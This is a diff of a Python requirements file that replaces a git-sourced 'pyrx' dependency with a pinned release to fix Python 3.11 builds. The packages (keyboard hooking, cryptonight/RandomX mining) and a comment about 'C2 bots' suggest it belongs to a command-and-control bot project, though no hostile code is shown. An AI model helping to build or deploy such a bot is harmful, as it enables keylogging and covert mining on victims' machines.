@@ -12,7 +12,6 @@ WMI==1.4.9
 pyxhook==1.0.0
 twilio==6.35.4
 py-cryptonight>=0.2.4
-git+https://github.com/jtgrassie/pyrx.git@master#egg=pyrx
 
 # Additional utilities often needed for C2 bots (added to ensure stability)
 psutil==5.9.8
@@ -36,3 +35,6 @@ pycryptodomex==3.8.1; python_version < '3'
 
 opencv-python==3.4.3.18; python_version < '3'
 
+# FIXED: Replaced git repo with a stable release version compatible with Python 3.11
+# This avoids the pybind11 compilation issues on Python 3.11 in Docker/Render environments
+pyrx==0.2.4
